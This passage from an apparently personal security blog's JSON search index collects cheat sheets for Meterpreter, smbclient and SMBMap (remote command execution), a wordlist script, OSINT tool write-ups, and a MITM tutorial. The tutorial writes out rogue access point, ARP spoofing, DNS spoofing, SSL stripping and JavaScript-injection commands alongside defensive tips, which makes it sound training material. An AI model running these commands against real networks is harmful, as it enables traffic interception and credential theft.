away\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003emigrate \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Move Meterpreter to a different process to stay under the radar.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003erev2self\u003c/code\u003e\u003c/strong\u003e: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"file-system-commands\"\u003eFile System Commands\u003c/h2\u003e\n\u003cp\u003eFor poking around the file system:\u003c/p\u003e","title":"Meterpreter"},{"content":"smbclient is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\nBasic Usage To connect to an SMB file share, use the following syntax:\nsmbclient //server/share [options] Replace server with the hostname or IP address of the server hosting the file share. Replace share with the name of the file share. Once connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\nCommon Options -U \u0026lt;username\u0026gt;: Specify the username to use for authentication. -W \u0026lt;workgroup\u0026gt;: Specify the domain or workgroup. -I \u0026lt;IP address\u0026gt;: Directly specify the server\u0026rsquo;s IP address. -p \u0026lt;port\u0026gt;: Specify the port (default is 445). -d \u0026lt;debug level\u0026gt;: Set the debug level for verbose output. -N: Suppress the password prompt (useful for guest accounts). Available Commands Once connected, the following commands allow you to interact with the file share:\nls: List files and directories in the current directory. cd \u0026lt;directory\u0026gt;: Change to a different directory. pwd: Print the current working directory. put \u0026lt;file\u0026gt;: Upload a file to the share. get \u0026lt;file\u0026gt;: Download a file from the share. mput \u0026lt;files\u0026gt;: Upload multiple files. mget \u0026lt;files\u0026gt;: Download multiple files. rm \u0026lt;file\u0026gt;: Delete a file. mkdir \u0026lt;directory\u0026gt;: Create a new directory. rmdir \u0026lt;directory\u0026gt;: Remove a directory. exit: Disconnect from the share and exit smbclient. Examples List Files in a Share smbclient //server/share -c ls Connect with a Specific Username and Password smbclient //server/share -U username%password Connect Using an IP Address and Port smbclient //server/share -I 192.168.1.100 -p 139 Upload a File smbclient //server/share -c \u0026#34;put /path/to/local/file\u0026#34; Download a File smbclient //server/share -c \u0026#34;get /path/to/remote/file\u0026#34; Create a New Directory smbclient //server/share -c \u0026#34;mkdir newdirectory\u0026#34; When to Use smbclient Quick Access: Need to interact with a file share without mounting it? smbclient gives you immediate access. Testing Permissions: Check which directories and files are accessible under different credentials. File Operations: Download, upload, or manage files on SMB shares. Debugging: Troubleshoot network shares with verbose output using -d. Final Thoughts smbclient is a powerful yet straightforward tool for interacting with SMB shares. Whether you’re performing quick tests or conducting audits, it streamlines tasks that would otherwise require mounting shares. Keep this cheat sheet handy for quick reference and efficient file share management!\n","permalink":"http://localhost:1313/cheat-sheets/smbclient/","summary":"\u003cp\u003e\u003cstrong\u003esmbclient\u003c/strong\u003e is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\u003c/p\u003e\n\u003ch2 id=\"basic-usage\"\u003eBasic Usage\u003c/h2\u003e\n\u003cp\u003eTo connect to an SMB file share, use the following syntax:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbclient //server/share \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eserver\u003c/code\u003e\u003c/strong\u003e with the hostname or IP address of the server hosting the file share.\u003c/li\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eshare\u003c/code\u003e\u003c/strong\u003e with the name of the file share.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOnce connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\u003c/p\u003e","title":"smbclient"},{"content":"SMBMap is a command-line tool for enumerating and interacting with SMB shares. It allows you to execute commands, upload/download files, and assess permissions effectively.\nBasic Syntax smbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; [options] Common Usage Examples Connect with Null Password smbmap -u guest -p \u0026#34;\u0026#34; -d . -H 192.168.1.1 Connect as Admin with Password smbmap -u admin -p password123 -d . -H 192.168.1.1 Execute a Command smbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u0026#39;ipconfig\u0026#39; Connect to a Specific Drive smbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u0026#39;C$\u0026#39; Upload a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u0026#39;/path/to/file.txt\u0026#39; \u0026#39;C$\\file.txt\u0026#39; Download a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u0026#39;C$\\file.txt\u0026#39; Enumerate a Specific Share smbmap -H 192.168.1.1 -s \u0026#39;share_name\u0026#39; Enumerate Users smbmap -H 192.168.1.1 --users Key Options -u \u0026lt;username\u0026gt;: Specify the username. -p \u0026lt;password\u0026gt;: Specify the password. -H \u0026lt;host\u0026gt;: Specify the target host. -r \u0026lt;share\u0026gt;: Connect to a specific share or drive. -x \u0026lt;command\u0026gt;: Execute a command on the target. --upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;: Upload a file to the target. --download \u0026lt;remote_file\u0026gt;: Download a file from the target. -s \u0026lt;share\u0026gt;: Enumerate a specific share. --users: Enumerate users on the target. -R: Check for shares with full permissions. -p \u0026lt;port\u0026gt;: Specify a port. When to Use SMBMap Permission Audits: Quickly identify shares with read, write, or full access permissions. Command Execution: Execute remote commands on accessible shares. File Transfers: Upload or download files directly from SMB shares. User Enumeration: Discover user accounts configured on the target system. Final Thoughts SMBMap is an efficient and user-friendly tool for SMB enumeration and interaction. Its flexibility makes it ideal for penetration testing and auditing SMB shares. Keep this cheat sheet handy to streamline your workflows.\n","permalink":"http://localhost:1313/cheat-sheets/smbmap/","summary":"\u003cp\u003e\u003cstrong\u003eSMBMap\u003c/strong\u003e is a command-line tool for enumerating and interacting with SMB shares. It allows you to execute commands, upload/download files, and assess permissions effectively.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-usage-examples\"\u003eCommon Usage Examples\u003c/h2\u003e\n\u003ch3 id=\"connect-with-null-password\"\u003eConnect with Null Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u guest -p \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-as-admin-with-password\"\u003eConnect as Admin with Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"execute-a-command\"\u003eExecute a Command\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ipconfig\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-to-a-specific-drive\"\u003eConnect to a Specific Drive\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"upload-a-file\"\u003eUpload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/path/to/file.txt\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"download-a-file\"\u003eDownload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-a-specific-share\"\u003eEnumerate a Specific Share\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 -s \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;share_name\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-users\"\u003eEnumerate Users\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 --users\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"key-options\"\u003eKey Options\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the username.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-H \u0026lt;host\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target host.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Connect to a specific share or drive.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-x \u0026lt;command\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Execute a command on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Upload a file to the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--download \u0026lt;remote_file\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Download a file from the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Enumerate a specific share.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--users\u003c/code\u003e\u003c/strong\u003e: Enumerate users on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Check for shares with full permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;port\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a port.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"when-to-use-smbmap\"\u003eWhen to Use SMBMap\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePermission Audits\u003c/strong\u003e: Quickly identify shares with read, write, or full access permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCommand Execution\u003c/strong\u003e: Execute remote commands on accessible shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFile Transfers\u003c/strong\u003e: Upload or download files directly from SMB shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUser Enumeration\u003c/strong\u003e: Discover user accounts configured on the target system.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"final-thoughts\"\u003eFinal Thoughts\u003c/h2\u003e\n\u003cp\u003eSMBMap is an efficient and user-friendly tool for SMB enumeration and interaction. Its flexibility makes it ideal for penetration testing and auditing SMB shares. Keep this cheat sheet handy to streamline your workflows.\u003c/p\u003e","title":"SMBMap"},{"content":"Sometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this Wordlist Generator comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\nWhy Bash? You might be asking, why Bash? Well, there’s beauty in simplicity. This script was created to strip down the task to its essentials: no dependencies, no extra fuss, just the native power of Bash. While there are plenty of tools out there for generating wordlists, this one leans into the Unix philosophy—do one thing, and do it well.\nHow It Works The script takes one or more text files as input, extracts the words, normalizes them to lowercase, removes duplicates, sorts them, and outputs everything into a file called wordlist.txt. The end result? A clean, ordered list of unique words ready for your next project.\nKey Features Simple Input: Accepts multiple text files as input. Automatic Sorting: Ensures the wordlist is alphabetically ordered. No Dependencies: Works out of the box with any modern Bash shell. Efficiency: Processes files with a single command pipeline. Getting Started Installation Just grab the script at the bottom of this page, make it executable, and you’re good to go. Or you can get it on my github :\ngit clone https://github.com/noobosaurus-r3x/Wordlister cd Wordlister chmod +x wordlister.sh Usage The script is designed to be intuitive and easy to use. Here’s the basic syntax:\n./wordlister.sh file1.txt file2.txt file3.txt What It Does Combines the contents of all provided text files. Extracts words by splitting on non-alphanumeric characters. Converts all words to lowercase to avoid duplicates like Word and word. Removes duplicates entirely. Outputs the results into wordlist.txt in the current directory. Example Imagine you have two text files, file1.txt and file2.txt, and you want to generate a wordlist:\nRun the script:\n./wordlister.sh file1.txt file2.txt The script processes the files and outputs:\nCreated wordlist with 500 words Open wordlist.txt to see your results.\nNotes If no files are provided, the script will display a usage message and exit. The output file is overwritten each time the script runs, so be sure to back up your previous wordlists if needed. The Script For those who want a peek under the hood, here’s the full script:\n#!/usr/bin/env bash set -euo pipefail IFS=$\u0026#39;\\n\\t\u0026#39; if [ $# -eq 0 ]; then echo \u0026#34;Usage: $0 \u0026lt;text_file1\u0026gt; [\u0026lt;text_file2\u0026gt; ...]\u0026#34; exit 1 fi wordlist=\u0026#34;wordlist.txt\u0026#34; # Process input files to extract unique words in lowercase LC_ALL=C cat \u0026#34;$@\u0026#34; \\ | tr -c \u0026#39;[:alnum:]\u0026#39; \u0026#39;\\n\u0026#39; \\ | tr \u0026#39;[:upper:]\u0026#39; \u0026#39;[:lower:]\u0026#39; \\ | sort -u \u0026gt; \u0026#34;$wordlist\u0026#34; word_count=$(wc -l \u0026lt; \u0026#34;$wordlist\u0026#34;) echo \u0026#34;Created wordlist with $word_count words\u0026#34; Why Use This Script? If you need a no-nonsense way to generate a wordlist, this script has you covered. It’s lightweight, fast, and doesn’t require any external tools or libraries. Whether you’re working in cybersecurity, natural language processing, or simply organizing your text data, this Bash script is a reliable companion.\nFinal Thoughts Sometimes the simplest tools are the most effective. This wordlist generator isn’t trying to be fancy; it’s just trying to do the job—and it does it well. If you’ve got improvements or ideas, feel free to tweak the script to fit your needs. After all, the best tools are the ones you make your own.\n","permalink":"http://localhost:1313/tools/wordlister/","summary":"\u003cp\u003eSometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this \u003cstrong\u003eWordlist Generator\u003c/strong\u003e comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\u003c/p\u003e","title":"Wordlister"},{"content":"MITM Attacks: How to Crash the Party Between Alice and Bob Man-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, “Don’t mind me.” Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes tweaking what’s being said.\nToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\nWhat Even Is a Man-in-the-Middle Attack? Picture this: Alice and Bob are exchanging secrets—love letters, memes, bank details, or maybe just complaining about Carol. They think they’re communicating directly, but little do they know, Carol is sitting in the middle, reading every word, tweaking the conversation, and cackling like a villain in a bad spy movie.\nIn the digital world, Alice could be your laptop, Bob a website or server, and Carol a hacker lurking on your café’s Wi-Fi or corporate network. She intercepts traffic, decrypts it (sometimes), and messes with it however she pleases.\nThe terrifying part? This can happen to you without you realizing it—until it’s too late.\nHow Carol Crashes the Party: Common MITM Tricks Carol’s bag of tricks is stuffed with clever (and sometimes shockingly simple) ways to hijack your traffic. Here’s how she pulls it off:\n1. Rogue Wi-Fi Access Points: Carol’s Favorite Honeytrap Setting up a rogue Wi-Fi access point doesn’t require much more than a laptop, a coffee shop corner, and a catchy SSID like Free_Cafe_WiFi or Starbux_Free. You think you’re connecting to free Wi-Fi for your overpriced latte, but you’re actually walking straight into Carol’s trap.\nHow It Works (The Tech Bit): Broadcast the Trap: Carol uses tools like Airbase-ng to create a fake access point. airbase-ng -e \u0026#34;Starbux_Guest\u0026#34; -c 6 wlan0mon Monitor the Victims: Your device connects, trusting the familiar name. Carol now acts as the gateway to the internet. Proxy the Traffic: With tools like ettercap or mitmproxy, Carol routes all your traffic through her machine. She can sniff, modify, or inject malware at will. bettercap -T -q -M arp:remote // // -i wlan0 Optional Evil Fun: Carol can inject JavaScript keyloggers, replace downloads with malware, or redirect DNS queries to phishing pages. Why It’s Effective Devices love auto-connecting to networks they recognize, and humans… well, we love free Wi-Fi.\nDefense Tip: Always use a VPN. It wraps your data in encryption, making Carol’s snooping session as useful as watching a scrambled TV channel from the 90s.\n2. ARP Spoofing: “Hi, I’m the Router Now” ARP (Address Resolution Protocol) is like the phonebook for local networks, mapping IP addresses to MAC addresses. But ARP has a fatal flaw: it trusts everyone. Carol exploits this blind trust to impersonate the router and redirect all traffic through herself.\nHow It Works: Carol tells the router: “Hey, I’m Alice.” Carol tells Alice: “Hey, I’m the router.” Traffic meant for Alice or the router now flows through Carol. arpspoof -i eth0 -t 192.168.1.10 -r 192.168.1.1 Why It’s Effective On a LAN, ARP spoofing is lightning-fast and stealthy. Carol can:\nSniff unencrypted traffic with Wireshark. Modify requests in real time. Drop packets because chaos is fun. The Tell: On compromised machines, running arp -a often exposes duplicate MAC addresses—a sign Carol’s in the mix.\nDefense Tip: Use ARP detection tools like Arpwatch or enable Dynamic ARP Inspection (DAI) on managed switches.\n3. DNS Spoofing: Carol’s Redirection Magic You type bank.com into your browser. Carol decides that’s cute and redirects you to fak3bank.com—a malicious clone where she harvests your login details.\nHow It Works: Carol intercepts DNS requests (via tools like tcpdump): tcpdump -i eth0 udp port 53 She injects a fake DNS response faster than the real DNS server: dnsspoof -i eth0 -f dns_hosts Example dns_hosts file: 133.7.133.7 google.com You land on Carol’s server, which looks real enough for you to log in like a good, oblivious citizen. Defense Tip: Use DNSSEC to validate DNS responses and encrypt queries with DNS-over-HTTPS (DoH).\n4. SSL Stripping: Downgrading You Back to 2005 You know HTTPS—the comforting padlock in your browser bar? Carol strips it away like a magician revealing a trapdoor.\nHow It Works: You type https://example.com. Carol intercepts and strips the HTTPS headers, forcing a plain old HTTP connection. Everything—passwords, credit card info, embarrassing searches—travels unencrypted. bettercap -iface eth0 -caplet https-ui Carol logs it all. The tiny missing s in HTTPS becomes the gateway to your digital life.\nDefense Tip: Use HSTS (HTTP Strict Transport Security) and browser extensions like HTTPS Everywhere to force secure connections.\n5. HTTPS Spoofing: Fake Certificates, Real Problems If SSL stripping is a blunt hammer, HTTPS spoofing is a precision scalpel. Carol doesn’t remove encryption—she fakes it.\nHow It Works: Carol generates a self-signed SSL certificate to impersonate a legitimate server: openssl req -new -x509 -keyout fakekey.pem -out fakecert.pem She intercepts the connection, swapping the real SSL cert for her fake one. Your browser thinks it’s secure (padlock and all), and Carol decrypts everything. Why It Works Most people trust the padlock icon without ever inspecting the certificate details.\nDefense Tip: Use certificate pinning to reject impostor certificates and manually verify SSL certificates for sensitive services.\nMITM Isn’t Just Eavesdropping—It’s Total Manipulation MITM doesn’t stop at listening. Carol can inject malware, redirect you to phishing sites, or swap out legitimate downloads with compromised files. She can even inject JavaScript into HTTP traffic to keylog everything you type. Tools like Bettercap make this child’s play:\nbettercap -iface eth0 -caplet js-inject Final Thoughts: How to Keep Carol Out MITM attacks exploit trust—trust in open networks, unverified certificates, or unsecured protocols. But with a few defenses, you can kick Carol out of the party:\nAlways use a VPN on public networks. Enable HSTS, DNSSEC, and encrypted DNS (DoH/DoT). Inspect SSL certificates, especially on critical services. Watch for anomalies: duplicate MAC addresses, suspicious DNS redirects, or missing HTTPS. In short: trust no one, especially not the Wi-Fi named Free_Cafe_WiFi. Carol’s out there, latte in hand, waiting for you to slip up. Don’t give her the satisfaction.\n","permalink":"http://localhost:1313/articles/mitm_crash_a_party/","summary":"\u003ch1 id=\"mitm-attacks-how-to-crash-the-party-between-alice-and-bob\"\u003e\u003cstrong\u003eMITM Attacks: How to Crash the Party Between Alice and Bob\u003c/strong\u003e\u003c/h1\u003e\n\u003cp\u003eMan-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, \u003cem\u003e“Don’t mind me.”\u003c/em\u003e Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes \u003cem\u003etweaking\u003c/em\u003e what’s being said.\u003c/p\u003e\n\u003cp\u003eToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\u003c/p\u003e","title":"MITM Attacks"},{"content":"InspecTor: A Streamlined Tool for Website Metadata Extraction Pulling metadata from websites was once a straightforward task. You could hit a few URLs, scrape the required data, and move on. However, with the rise of dynamic content, Tor-hidden services (.onion domains), and increasing anonymity concerns, the process became far more complex. InspecTor is a command-line tool I developed to address these challenges. It simplifies metadata extraction from websites, including Tor services, while preserving user anonymity.\nTo clarify, I’m not a professional developer, just someone who needed a functional solution when existing tools fell short. Most scrapers I tried either broke on .onion domains or failed to process JavaScript-heavy pages. I created InspecTor to extract emails, links, images, and other relevant data without exposing my IP address. While it’s not perfect, it works and might save you some headaches too.\nWhat Makes InspecTor Stand Out? InspecTor focuses on three core capabilities:\nMetadata Extraction: It retrieves emails, phone numbers, links, images, and other exposed data from websites. Tor Support: Requests are routed through the Tor network, enabling anonymous access to .onion domains and privacy-sensitive sites. Dynamic Content Handling: By leveraging Selenium, InspecTor processes JavaScript-heavy pages that traditional scrapers typically ignore. Combined with multithreading for concurrent URL processing, InspecTor offers an efficient way to gather metadata while avoiding flags or blocks.\nKey Features Anonymous Scraping: Routes all requests through the Tor network for IP anonymity and seamless .onion domain access. Dynamic Content Support: Processes JavaScript-dependent pages using Selenium. Targeted Metadata Extraction: Retrieve specific fields like emails, phone numbers, images, and links. Concurrent Processing: Multithreading allows simultaneous scraping of multiple URLs for improved speed. Flexible Output Formats: Export results to JSON, SQLite, or human-readable formats. Configurable Options: Adjust threading, output fields, SSL verification, and more. Setting Up InspecTor 1. Clone the Repository git clone https://github.com/noobosaurus-r3x/InspecTor.git cd InspecTor 2. Install Dependencies pip install -r requirements.txt 3. Install Tor Ensure Tor is installed and running to route requests.\nsudo apt update sudo apt install tor sudo systemctl start tor 4. Set Up Selenium (Optional for Dynamic Content) Install Chrome and ChromeDriver. Ensure ChromeDriver matches your browser version.\nUsing InspecTor Extract Metadata from Specific URLs Provide single or multiple URLs:\npython3 InspecTor.py -u https://example.com https://example.onion Process a File of URLs Input a list of targets from a file:\npython3 InspecTor.py -f urls.txt Force Tor for All Traffic Route all requests through Tor, even for non-.onion domains:\npython3 InspecTor.py -u https://example.com --force-tor Save Results to JSON or SQLite Export metadata to a file or database:\npython3 InspecTor.py -u https://example.onion -o metadata.json python3 InspecTor.py -u https://example.onion --database metadata.db Extract Specific Fields Focus on targeted data:\npython3 InspecTor.py -u https://example.onion --fields emails links -o contact_info.json Handle JavaScript Content Enable Selenium for scraping JavaScript-dependent pages:\npython3 InspecTor.py -u https://example.onion --use-selenium Example Commands Extract everything: python3 InspecTor.py -u https://example.onion --extract-all -o all_metadata.json Grab emails and phone numbers: python3 InspecTor.py -u https://example.com --fields emails phone_numbers -o contact_info.json Ignore SSL certificate issues: python3 InspecTor.py -u https://example.onion --no-verify-ssl --human-readable Output Formats JSON: Structured file output for further processing. SQLite: Database storage for querying and analysis. Human-Readable: Clean, formatted text output for quick reviews. Notes on Tor and Dynamic Content Tor Requirements: Tor must be running on 127.0.0.1:9050. Selenium Setup: Ensure Chrome and ChromeDriver versions match for dynamic content scraping. SSL Verification: Enabled by default; use --no-verify-ssl to bypass invalid certificates. Threading: Control parallel processing with --max-workers for faster scraping. Why I Built InspecTor InspecTor was born out of necessity. Existing tools often fell short when handling .onion domains or JavaScript-heavy pages. As someone who needed a simple and effective way to extract metadata for OSINT investigations, website audits, and cybersecurity research, I created InspecTor.\nIt’s not perfect, but it works. If it helps you solve a problem, that’s great. If you find ways to improve it, even better.\n\u0026ndash;\n","permalink":"http://localhost:1313/tools/inspector/","summary":"\u003ch2 id=\"inspector-a-streamlined-tool-for-website-metadata-extraction\"\u003eInspecTor: A Streamlined Tool for Website Metadata Extraction\u003c/h2\u003e\n\u003cp\u003ePulling metadata from websites was once a straightforward task. You could hit a few URLs, scrape the required data, and move on. However, with the rise of dynamic content, Tor-hidden services (.onion domains), and increasing anonymity concerns, the process became far more complex. InspecTor is a command-line tool I developed to address these challenges. It simplifies metadata extraction from websites, including Tor services, while preserving user anonymity.\u003c/p\u003e","title":"InspecTor"},{"content":"Gathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where Osintagram comes in: a simple script I put together to finally get Instagram OSINT working again.\nI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\nWhy Osintagram? If you’ve ever tried to scrape data from Instagram, you’ve probably hit limitations like expired session cookies or blocked API calls. Osintagram addresses these issues by:\nUsing Session Cookies: It requires an Instagram session cookie (sockpuppet accounts recommended). This lets you sidestep some of the traditional 